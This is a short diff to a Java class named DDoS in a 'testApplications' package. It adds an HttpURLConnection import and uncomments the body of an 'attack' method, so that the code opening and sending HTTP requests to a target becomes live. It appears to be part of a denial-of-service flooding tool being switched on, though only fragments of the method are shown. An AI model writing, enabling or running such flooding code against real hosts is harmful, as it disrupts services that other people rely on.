@@ -1,5 +1,6 @@
 package testApplications;
 
+import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
 import java.util.concurrent.atomic.AtomicBoolean;
@@ -53,7 +54,7 @@ public class DDoS {
  
         public void attack(String newhost) throws Exception {
             
-            /*
+            
             HttpURLConnection connection = (HttpURLConnection) url.openConnection();
             connection.setDoOutput(true);
             connection.setDoInput(true);
@@ -67,7 +68,7 @@ public class DDoS {
             System.out.println(this + " " + connection.getResponseCode());
             System.out.println(connection.getHeaderFields());
             connection.getInputStream();
-            */
+            
 
 
 
